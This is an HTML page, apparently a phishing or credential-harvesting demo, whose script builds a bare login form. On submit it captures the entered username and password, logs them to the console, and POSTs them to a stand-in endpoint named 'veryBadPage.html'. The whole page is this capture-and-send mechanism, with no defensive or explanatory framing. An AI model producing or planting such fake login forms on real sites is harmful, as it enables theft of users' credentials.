<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title></title>
    <meta name="description">
    <meta name="viewport" >
  </head>

  <body>
    <script type="text/javascript">
    var form = document.createElement("FORM");
    form.setAttribute("method", "POST");
    form.setAttribute("accept-charset", "utf-8");
    form.setAttribute("action", "");
    form.setAttribute("id", "myform");

    var usernameControl = document.createElement("input");
    usernameControl.setAttribute("id", "username");
    usernameControl.setAttribute("name", "username");
    usernameControl.setAttribute("type", "text");


    var passwordControl = document.createElement("input");
    passwordControl.setAttribute("id", "password");
    passwordControl.setAttribute("name", "password");
    passwordControl.setAttribute("type", "password");

    var submit = document.createElement("input");
    submit.setAttribute("name", "submit");
    submit.setAttribute("value", "Log in");
    submit.setAttribute("type", "submit");


    form.appendChild(usernameControl);
    form.appendChild(document.createElement("br"));
    form.appendChild(passwordControl);
    form.appendChild(document.createElement("br"));
    form.appendChild(document.createElement("br"));
    form.appendChild(submit);

    document.getElementsByTagName('body')[0].appendChild(form);

      document.getElementById('myform').addEventListener('submit', function(e) {

        e.preventDefault();
        e.stopPropagation();
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        console.log("Username: " + username);
        console.log("Password: " + password);

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
           console.log("Yes you did it!");
          }
        };
        xhttp.open("POST", "veryBadPage.html", true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send("username=" + username + "&password=" + password);
      });
    </script>
  </body>
</html>
